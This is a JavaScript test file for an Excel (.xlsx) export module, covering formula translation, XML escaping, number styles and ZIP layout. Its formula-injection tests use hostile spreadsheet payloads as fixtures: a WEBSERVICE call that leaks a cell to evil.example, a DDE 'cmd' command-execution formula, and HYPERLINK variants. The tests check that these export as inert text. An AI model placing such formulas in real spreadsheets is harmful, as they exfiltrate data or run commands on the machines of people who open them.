// test-cells-xlsx.js - the .xlsx writer for ```cells sheets.
//
// SDocCellsXlsx builds a real Excel workbook (Office Open XML SpreadsheetML
// in a stored, uncompressed ZIP) from a cell model: numbers as values, text
// as inline strings, =formulas as live Excel formulas that recalculate on
// open. Because the ZIP is stored (no compression), tests can assert on the
// raw bytes directly.
//
// Security contract (the CSV-injection guard): a formula may only export as
// a live Excel formula when our engine evaluated it - proof it stays inside
// our purely computational grammar. Unknown functions (WEBSERVICE, HYPERLINK,
// DDE payloads, VLOOKUP...) export as inert text.
const assert = require('assert');
const path = require('path');

module.exports = (h) => {
  const { test } = h;
  const XLSX = require(path.join(__dirname, '..', 'public', 'sdocs-cells-xlsx.js'));
  const CELLS = require(path.join(__dirname, '..', 'public', 'sdocs-cells.js'));
  const FX = require(path.join(__dirname, '..', 'public', 'sdocs-cells-formula.js'));

  const bytesToStr = (bytes) => Buffer.from(bytes).toString('latin1');

  // ── CRC32 ───────────────────────────────────────────────
  test('xlsx: crc32 matches the standard test vector', () => {
    // CRC-32 of the ASCII string "123456789" is 0xCBF43926.
    const data = new TextEncoder().encode('123456789');
    assert.strictEqual(XLSX.crc32(data) >>> 0, 0xcbf43926);
  });

  // ── Formula translation ─────────────────────────────────
  test('xlsx: excelFormula strips the = and keeps Excel-native functions', () => {
    assert.strictEqual(XLSX.excelFormula('=SUM(B2:B5)'), 'SUM(B2:B5)');
    assert.strictEqual(XLSX.excelFormula('=B2*C2'), 'B2*C2');
    assert.strictEqual(XLSX.excelFormula('=IF(B2>20, 1, 0)'), 'IF(B2>20, 1, 0)');
  });

  test('xlsx: excelFormula maps AVG (our alias) to Excel\'s AVERAGE', () => {
    assert.strictEqual(XLSX.excelFormula('=AVG(B2:B5)'), 'AVERAGE(B2:B5)');
    assert.strictEqual(XLSX.excelFormula('=avg(B2:B5)'), 'AVERAGE(B2:B5)');
    // AVERAGE itself passes through untouched (no AVERAGEAGE mangling).
    assert.strictEqual(XLSX.excelFormula('=AVERAGE(B2:B5)'), 'AVERAGE(B2:B5)');
    // Nested calls are renamed too.
    assert.strictEqual(XLSX.excelFormula('=ROUND(AVG(B2:B5), 1)'), 'ROUND(AVERAGE(B2:B5), 1)');
  });

  test('xlsx: newer Excel functions receive the OOXML future-function prefix', () => {
    assert.strictEqual(XLSX.excelFormula('=XLOOKUP(A1,B1:B3,C1:C3)'),
      '_xlfn.XLOOKUP(A1,B1:B3,C1:C3)');
    assert.strictEqual(XLSX.excelFormula('=CONCAT("a","b")'), '_xlfn.CONCAT("a","b")');
    assert.strictEqual(XLSX.excelFormula('="AVG("&"XLOOKUP("&"CONCAT("'),
      '"AVG("&"XLOOKUP("&"CONCAT("');
  });

  test('xlsx: typed text and boolean formula caches survive without numeric coercion', () => {
    const model = CELLS.parseCells(CELLS.serializeCsv([
      ['Text', 'Bool'],
      ['=UPPER("ok")', '=AND(TRUE,1)'],
    ]));
    const fx = FX.recalc(model);
    const xml = XLSX.sheetXml(model, fx);
    assert.ok(xml.indexOf('t="str"><f>UPPER(&quot;ok&quot;)</f><v>OK</v>') >= 0, xml);
    assert.ok(xml.indexOf('t="b"><f>AND(TRUE,1)</f><v>1</v>') >= 0, xml);
  });

  // ── Worksheet XML ───────────────────────────────────────
  test('xlsx: sheetXml emits numbers, inline strings, and formulas', () => {
    const model = CELLS.parseCells('Item,Qty\nLaptop,12\nTotal,=SUM(B2:B2)');
    const fx = FX.recalc(model);
    const xml = XLSX.sheetXml(model, fx);
    assert.ok(xml.indexOf('<is><t xml:space="preserve">Item</t></is>') >= 0, 'text as inline string');
    assert.ok(/<c r="B2" s="\d+"><v>12<\/v><\/c>/.test(xml), 'number as styled value');
    assert.ok(xml.indexOf('<f>SUM(B2:B2)</f>') >= 0, 'formula with = stripped');
    assert.ok(xml.indexOf('<f>SUM(B2:B2)</f><v>12</v>') >= 0, 'cached formula result');
  });

  test('xlsx: sheetXml escapes XML special characters in text', () => {
    const model = CELLS.parseCells('a\n"<b> & </b>"');
    const xml = XLSX.sheetXml(model, null);
    assert.ok(xml.indexOf('&lt;b&gt; &amp; &lt;/b&gt;') >= 0, 'escaped entities present');
    assert.ok(xml.indexOf('<b>') < 0, 'no raw markup leaks through');
  });

  test('xlsx: sheetXml removes characters forbidden by XML 1.0', () => {
    const model = CELLS.parseCells('a\n"before\u0001after"');
    const xml = XLSX.sheetXml(model, null);
    assert.ok(xml.indexOf('\u0001') < 0, 'U+0001 would make worksheet XML malformed');
    assert.ok(xml.indexOf('before') >= 0 && xml.indexOf('after') >= 0, 'surrounding text is preserved');
  });

  test('xlsx: sheetXml skips empty cells and empty rows', () => {
    const model = CELLS.parseCells('a,,c\n,,');
    const xml = XLSX.sheetXml(model, null);
    // Row 2 is all-empty: no <row r="2">. Cell B1 is empty: no <c r="B1">.
    assert.ok(xml.indexOf('<row r="2">') < 0, 'empty row skipped');
    assert.ok(xml.indexOf('r="B1"') < 0, 'empty cell skipped');
    assert.ok(xml.indexOf('r="A1"') >= 0 && xml.indexOf('r="C1"') >= 0, 'real cells kept');
  });

  test('xlsx: a formula error emits a live formula with a typed error cache', () => {
    const model = CELLS.parseCells('a\n=1/0');
    const fx = FX.recalc(model);
    const xml = XLSX.sheetXml(model, fx);
    assert.ok(xml.indexOf('<f>1/0</f>') >= 0, 'formula exported');
    assert.ok(xml.indexOf('t="e"><f>1/0</f><v>#DIV/0!</v>') >= 0, 'typed error cache');
  });

  // ── Formula laundering (CSV-injection) protection ───────
  // The browser renderer is inert for unknown functions (they show #NAME?),
  // but the .xlsx download is opened in Excel where WEBSERVICE / HYPERLINK /
  // DDE payloads are live. A formula may only export as a live Excel formula
  // when OUR engine evaluated it. Everything else exports as inert text.
  test('xlsx: dangerous / unknown Excel functions export as inert text, never as formulas', () => {
    const payloads = [
      '=WEBSERVICE("http://evil.example/?leak="&A1)',
      '=HYPERLINK("http://evil.example","Total")',
      "=cmd|'/c calc'!A0",
      '=VLOOKUP(A1,B:C,2)',
    ];
    const src = 'a\n' + payloads.map(p => '"' + p.replace(/"/g, '""') + '"').join('\n');
    const model = CELLS.parseCells(src);
    const fx = FX.recalc(model);
    const xml = XLSX.sheetXml(model, fx);
    assert.ok(xml.indexOf('<f>') < 0, 'no live formulas at all, got: ' + xml);
    assert.ok(xml.indexOf('t="inlineStr"') >= 0, 'payloads exported as inline strings');
    assert.ok(xml.indexOf('WEBSERVICE') >= 0, 'payload text still visible (inert)');
  });

  test('xlsx: export safety inspects unknown functions in unchosen IF branches', () => {
    // A numeric result does not prove the entire AST is safe: IF is lazy, so
    // the current value can avoid a dangerous branch that becomes live after
    // the user changes A2 in Excel.
    const payloads = [
      '=IF(A2,1,WEBSERVICE(B2))',
      '=IF(A2,1,HYPERLINK(B2))',
    ];
    const src = CELLS.serializeCsv([
      ['Flag', 'URL', 'Result'],
      ['1', 'https://evil.example', payloads[0]],
      ['1', 'https://evil.example', payloads[1]],
    ]);
    const model = CELLS.parseCells(src);
    const fx = FX.recalc(model);
    const xml = XLSX.sheetXml(model, fx);
    assert.strictEqual(fx[1][2].value, 1, 'fixture reaches the safe IF branch today');
    assert.strictEqual(fx[2][2].value, 1, 'second fixture reaches the safe IF branch today');
    assert.ok(xml.indexOf('<f>') < 0, 'unknown functions anywhere in the AST stay inert');
    payloads.forEach((payload) => {
      assert.ok(xml.indexOf(payload) >= 0, 'payload remains visible as inert text');
    });
  });

  test('xlsx: a literal #REF! cannot stop validation before a dangerous suffix', () => {
    // formulaSelfContained historically read #REF! as a reference to a sheet
    // named REF. Include that sheet so the regression exercises the complete
    // build path, not only sheetXml without workbook context.
    const ref = CELLS.parseCells('x\n1');
    const out = CELLS.parseCells(CELLS.serializeCsv([
      ['URL', 'Result'],
      ['https://evil.example', '=IFERROR(#REF!,WEBSERVICE(A2))'],
    ]));
    const sheets = [{ name: 'REF', model: ref }, { name: 'Out', model: out }];
    const grids = FX.recalcWorkbook(sheets);
    const s = bytesToStr(XLSX.buildXlsxWorkbook(sheets, grids));
    assert.ok(s.indexOf('<f>IFERROR') < 0, 'the unparsed suffix never becomes a live formula');
    assert.ok(s.indexOf('=IFERROR(#REF!') >= 0, 'payload remains visible as inert text');
  });

  test('xlsx: formulas depending on inert formulas also stay inert', () => {
    const model = CELLS.parseCells(CELLS.serializeCsv([
      ['Unsafe', 'Dependent'],
      ['=IF(TRUE,1,WEBSERVICE(A1))', '=A2+1'],
    ]));
    const fx = FX.recalc(model);
    const xml = XLSX.sheetXml(model, fx);
    assert.strictEqual(fx[1][1].safe, false);
    assert.ok(xml.indexOf('<f>') < 0, xml);
    assert.ok(xml.indexOf('=A2+1') >= 0, 'dependent remains visible and inert');
  });

  test('xlsx: malformed numeric formulas stay inert', () => {
    const model = CELLS.parseCells(CELLS.serializeCsv([['=1.2.3', '=1e', '=1e+']]));
    const xml = XLSX.sheetXml(model, FX.recalc(model));
    assert.ok(xml.indexOf('<f>') < 0, xml);
  });

  test('xlsx: without evaluation results (fx=null) formulas export as text, not live', () => {
    const model = CELLS.parseCells('a\n=SUM(A1:A1)');
    const xml = XLSX.sheetXml(model, null);
    assert.ok(xml.indexOf('<f>') < 0, 'no fx = no live formulas');
    assert.ok(xml.indexOf('=SUM(A1:A1)') >= 0, 'formula text kept as inert content');
  });

  test('xlsx: computational runtime errors (#DIV/0!, #CIRC!) still export live', () => {
    const model = CELLS.parseCells('a,b\n=1/0,=B2');
    const fx = FX.recalc(model);   // A2 -> #DIV/0!, B2 -> #CIRC! (self reference)
    const xml = XLSX.sheetXml(model, fx);
    assert.ok(xml.indexOf('<f>1/0</f>') >= 0, '#DIV/0! formula stays live');
    assert.ok(xml.indexOf('<f>B2</f>') >= 0, '#CIRC! formula stays live');
  });

  test('xlsx: syntax-broken formulas (#VALUE!) export as text - Excel could not parse them either', () => {
    const model = CELLS.parseCells('a\n"=SUM("');
    const fx = FX.recalc(model);
    const xml = XLSX.sheetXml(model, fx);
    assert.ok(xml.indexOf('<f>') < 0, 'broken syntax never exports as a formula');
    assert.ok(xml.indexOf('=SUM(') >= 0, 'kept as visible text');
  });

  // ── Number formats (format: directive -> styles) ────────
  test('xlsx: format directive columns carry a style index', () => {
    const model = CELLS.parseCells('format: B=$ C=%\nItem,Price,Margin\nA,1100,0.262');
    const xml = XLSX.sheetXml(model, null);
    // B2 (currency) and C2 (percent) get s= style attributes; A2 (text) does not.
    assert.ok(/<c r="B2" s="[0-9]+"><v>1100<\/v><\/c>/.test(xml), 'currency cell styled: ' + xml);
    assert.ok(/<c r="C2" s="[0-9]+"><v>0\.262<\/v><\/c>/.test(xml), 'percent cell styled');
    assert.ok(xml.indexOf('<c r="A2" t="inlineStr"><is>') >= 0, 'text cell unstyled');
  });

  test('xlsx: stylesXml defines currency and percent number formats', () => {
    const model = CELLS.parseCells('format: B=$ C=%\na,b,c\nx,1,0.5');
    const xml = XLSX.stylesXml(model);
    assert.ok(xml.indexOf('$#,##0.00') >= 0, 'currency format code');
    assert.ok(xml.indexOf('%') >= 0, 'percent format code');
    assert.ok(xml.indexOf('<cellXfs') >= 0, 'cell format records');
  });

  test('xlsx: stylesXml preserves the requested currency symbol', () => {
    const gbp = XLSX.stylesXml(CELLS.parseCells('format: A=£\nvalue\n1.25'));
    const eur = XLSX.stylesXml(CELLS.parseCells('format: A=€\nvalue\n1.25'));
    assert.ok(gbp.indexOf('£#,##0.00') >= 0, 'GBP does not become dollars');
    assert.ok(eur.indexOf('€#,##0.00') >= 0, 'EUR does not become dollars');
  });

  test('xlsx: default numbers display with no more than two decimals', () => {
    const styles = XLSX.stylesXml(CELLS.parseCells('value\n573195.15000000003'));
    assert.ok(styles.indexOf('#,##0.##') >= 0, 'default Excel style caps display precision');
  });

  test('xlsx: row and cell formats override broader rules', () => {
    const model = CELLS.parseCells('format: A=$ 2=% B2=£.0\nA,B,C\n1,2,3\n4,5,6');
    const xml = XLSX.sheetXml(model, null);
    const styles = XLSX.stylesXml(model);
    const a2 = xml.match(/<c r="A2" s="(\d+)"/);
    const b2 = xml.match(/<c r="B2" s="(\d+)"/);
    const c2 = xml.match(/<c r="C2" s="(\d+)"/);
    const a3 = xml.match(/<c r="A3" s="(\d+)"/);
    assert.ok(a2 && b2 && c2 && a3, xml);
    assert.strictEqual(a2[1], c2[1], 'row format applies across row 2');
    assert.notStrictEqual(b2[1], a2[1], 'B2 cell format overrides row 2');
    assert.notStrictEqual(a3[1], a2[1], 'column A format resumes on row 3');
    assert.ok(styles.indexOf('0.##%') >= 0, 'row percent style is included');
    assert.ok(styles.indexOf('£#,##0') >= 0, 'cell currency style is included');
    assert.ok(styles.indexOf('$#,##0.00') >= 0, 'column currency style is included');
  });

  // ── The full workbook (ZIP) ─────────────────────────────
  test('xlsx: buildXlsx returns a stored ZIP with the workbook parts', () => {
    const model = CELLS.parseCells('Item,Qty\nLaptop,12\nTotal,=SUM(B2:B2)');
    const fx = FX.recalc(model);
    const bytes = XLSX.buildXlsx(model, fx);
    const s = bytesToStr(bytes);
    assert.ok(bytes instanceof Uint8Array, 'returns bytes');
    assert.strictEqual(bytes[0], 0x50);                  // "P"
    assert.strictEqual(bytes[1], 0x4b);                  // "K"
    assert.ok(s.indexOf('[Content_Types].xml') >= 0);
    assert.ok(s.indexOf('xl/workbook.xml') >= 0);
    assert.ok(s.indexOf('xl/worksheets/sheet1.xml') >= 0);
    assert.ok(s.indexOf('xl/styles.xml') >= 0);
    assert.ok(s.indexOf('_rels/.rels') >= 0);
  });

  test('xlsx: the workbook recalculates formulas on open (fullCalcOnLoad)', () => {
    const model = CELLS.parseCells('a\n=1+1');
    const bytes = XLSX.buildXlsx(model, FX.recalc(model));
    const s = bytesToStr(bytes);
    // The ZIP is stored (uncompressed) so the workbook XML is readable in place.
    assert.ok(s.indexOf('fullCalcOnLoad="1"') >= 0, 'recalc-on-open flag set');
    assert.ok(s.indexOf('<f>1+1</f>') >= 0, 'formula present and live');
  });

  test('xlsx: zip entries carry correct sizes for a stored archive', () => {
    const model = CELLS.parseCells('a,b\n1,2');
    const bytes = XLSX.buildXlsx(model, null);
    // Walk local file headers: signature PK\x03\x04, method 0 (stored),
    // compressed size === uncompressed size.
    let i = 0, entries = 0;
    const view = new DataView(bytes.buffer, bytes.byteOffset, bytes.byteLength);
    while (i < bytes.length && view.getUint32(i, true) === 0x04034b50) {
      const method = view.getUint16(i + 8, true);
      const csize = view.getUint32(i + 18, true);
      const usize = view.getUint32(i + 22, true);
      const nameLen = view.getUint16(i + 26, true);
      const extraLen = view.getUint16(i + 28, true);
      assert.strictEqual(method, 0, 'entry is stored, not compressed');
      assert.strictEqual(csize, usize, 'stored sizes match');
      i += 30 + nameLen + extraLen + csize;
      entries++;
    }
    assert.strictEqual(entries, 6, 'content types, .rels, workbook, wb rels, styles, sheet');
  });

  // ── Multi-sheet workbook export (a cells "workbook" group -> one .xlsx) ──

  test('xlsx: single-sheet buildXlsx keeps the legacy hardcoded sheet (byte-stable path)', () => {
    const s = bytesToStr(XLSX.buildXlsx(CELLS.parseCells('a\n1'), null));
    assert.ok(s.indexOf('<sheet name="Sheet1" sheetId="1" r:id="rId1"/>') >= 0);
  });

  test('xlsx: buildXlsxWorkbook emits a worksheet part + a Content-Types Override per sheet', () => {
    const a = CELLS.parseCells('sdoc-cells: name="A"\nx\n1');
    const b = CELLS.parseCells('sdoc-cells: name="B"\ny\n2');
    const s = bytesToStr(XLSX.buildXlsxWorkbook([{ name: 'A', model: a }, { name: 'B', model: b }], []));
    assert.ok(s.indexOf('xl/worksheets/sheet1.xml') >= 0);
    assert.ok(s.indexOf('xl/worksheets/sheet2.xml') >= 0);
    const overrides = (s.match(/Override PartName="\/xl\/worksheets\/sheet\d+\.xml"/g) || []).length;
    assert.strictEqual(overrides, 2, 'one worksheet content-type override per sheet');
  });

  test('xlsx: workbook rels give each sheet a unique rId and styles a distinct one', () => {
    const a = CELLS.parseCells('sdoc-cells: name="A"\nx\n1');
    const b = CELLS.parseCells('sdoc-cells: name="B"\ny\n2');
    const s = bytesToStr(XLSX.buildXlsxWorkbook([{ name: 'A', model: a }, { name: 'B', model: b }], []));
    assert.ok(s.indexOf('Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"') >= 0);
    assert.ok(s.indexOf('Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet2.xml"') >= 0);
    assert.ok(s.indexOf('Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles"') >= 0);
    // sheetId (tab id) and r:id (rels pointer) stay aligned - crossing them makes Excel refuse the file.
    assert.ok(s.indexOf('<sheet name="A" sheetId="1" r:id="rId1"/>') >= 0);
    assert.ok(s.indexOf('<sheet name="B" sheetId="2" r:id="rId2"/>') >= 0);
  });

  test('xlsx: sheet names are sanitized to Excel rules and de-duped case-insensitively', () => {
    assert.strictEqual(XLSX.sanitizeSheetName('P&L: 2026 [draft]/v2'), 'P&L 2026 draft v2');
    assert.strictEqual(XLSX.sanitizeSheetName('X'.repeat(40)).length, 31);
    assert.strictEqual(XLSX.sanitizeSheetName(''), 'Sheet');
    assert.deepStrictEqual(XLSX.dedupeSheetNames(['Data', 'data', 'DATA']), ['Data', 'data~2', 'DATA~3']);
    const emoji = '😀'.repeat(31);
    const deduped = XLSX.dedupeSheetNames([emoji, emoji]);
    assert.strictEqual(Array.from(deduped[1]).length, 31);
    assert.ok(deduped[1].indexOf('\uFFFD') < 0, deduped[1]);
  });

  test('xlsx: a cross-sheet formula stays a live formula pointing at its sibling tab', () => {
    const drv = CELLS.parseCells('sdoc-cells: name="Drivers"\na\n5');
    const mdl = CELLS.parseCells('sdoc-cells: name="Model"\nt,=Drivers!A2*2');
    const grids = FX.recalcWorkbook([{ name: 'Drivers', model: drv }, { name: 'Model', model: mdl }]);
    const s = bytesToStr(XLSX.buildXlsxWorkbook([{ name: 'Drivers', model: drv }, { name: 'Model', model: mdl }], grids));
    assert.ok(s.indexOf('<f>Drivers!A2*2</f>') >= 0, 'cross-sheet reference exported as a live formula');
  });

  test('xlsx: duplicate sheet references keep the evaluator first-wins target', () => {
    const first = CELLS.parseCells('x\n100');
    const second = CELLS.parseCells('x\n200');
    const ref = CELLS.parseCells('result\n=Dup!A2');
    const sheets = [
      { name: 'Dup', model: first },
      { name: 'Dup', model: second },
      { name: 'Ref', model: ref },
    ];
    const grids = FX.recalcWorkbook(sheets);
    const s = bytesToStr(XLSX.buildXlsxWorkbook(sheets, grids));
    assert.strictEqual(grids[2][1][0].value, 100, 'local evaluator resolves the first Dup sheet');
    assert.ok(s.indexOf('<f>Dup!A2</f><v>100</v>') >= 0,
      'exported formula and cache point to the same first sheet');
    assert.ok(s.indexOf("<f>'Dup~2'!A2</f>") < 0, 'reference is not silently redirected to the de-duped tab');
  });

  test('xlsx: a named single sheet exports self-references to its real tab name', () => {
    const model = CELLS.parseCells('sdoc-cells: name="Sales"\nResult\n=Sales!A3*2\n5');
    const fx = FX.recalcWorkbook([{ name: 'Sales', model }])[0];
    const s = bytesToStr(XLSX.buildXlsx(model, fx));
    assert.strictEqual(fx[1][0].value, 10, 'fixture resolves through the named sheet');
    assert.ok(s.indexOf('<sheet name="Sales"') >= 0, 'workbook tab uses the logical sheet name');
    assert.ok(s.indexOf('<f>Sales!A3*2</f><v>10</v>') >= 0, 'self-reference targets that exported tab');
  });

  test('xlsx: a renamed/spaced target tab gets single-quoted in the formula', () => {
    // If a tab name sanitised to something with a space, the qualifier must quote it.
    assert.strictEqual(XLSX.excelFormula('=Drivers!B2+1', { drivers: 'Rev by Region' }), "'Rev by Region'!B2+1");
    // A plain identifier stays bare; a cell-address-like name is quoted.
    assert.strictEqual(XLSX.excelFormula('=Model!A1', { model: 'Model' }), 'Model!A1');
    assert.strictEqual(XLSX.excelFormula('=AB12!A1', { ab12: 'AB12' }), "'AB12'!A1");
  });

  test('xlsx: a single-sheet export degrades a cross-sheet formula to its value (no broken external link)', () => {
    const npv = CELLS.parseCells('sdoc-cells: name="NPV"\nY,R\n1,=Assumptions!B2*2');
    const asm = CELLS.parseCells('sdoc-cells: name="Assumptions"\nk,v\nbase,21');
    const grids = FX.recalcWorkbook([{ name: 'NPV', model: npv }, { name: 'Assumptions', model: asm }]);
    // Alone, NPV cannot reach Assumptions, so the formula must NOT ship as a
    // live link; it lands as its computed value (21*2 = 42) instead.
    const single = bytesToStr(XLSX.buildXlsx(npv, grids[0]));
    assert.ok(single.indexOf('Assumptions!') < 0, 'no dangling cross-sheet reference in a single-sheet export');
    assert.ok(single.indexOf('<v>42</v>') >= 0, 'the cell carries the computed value');
    // In the full workbook the sibling IS present, so it stays a live formula.
    const book = bytesToStr(XLSX.buildXlsxWorkbook([{ name: 'NPV', model: npv }, { name: 'Assumptions', model: asm }], grids));
    assert.ok(book.indexOf('<f>Assumptions!B2*2</f>') >= 0, 'the workbook export keeps the cross-sheet formula live');
  });

  test('xlsx: workbook entry count is the 5 fixed parts plus one per sheet', () => {
    const mk = (n) => CELLS.parseCells('sdoc-cells: name="' + n + '"\nx\n1');
    const bytes = XLSX.buildXlsxWorkbook([{ name: 'A', model: mk('A') }, { name: 'B', model: mk('B') }, { name: 'C', model: mk('C') }], []);
    let i = 0, entries = 0;
    const view = new DataView(bytes.buffer, bytes.byteOffset, bytes.byteLength);
    while (i < bytes.length && view.getUint32(i, true) === 0x04034b50) {
      const nameLen = view.getUint16(i + 26, true);
      const extraLen = view.getUint16(i + 28, true);
      const csize = view.getUint32(i + 18, true);
      i += 30 + nameLen + extraLen + csize;
      entries++;
    }
    assert.strictEqual(entries, 8, '5 fixed parts + 3 sheets');
  });
};
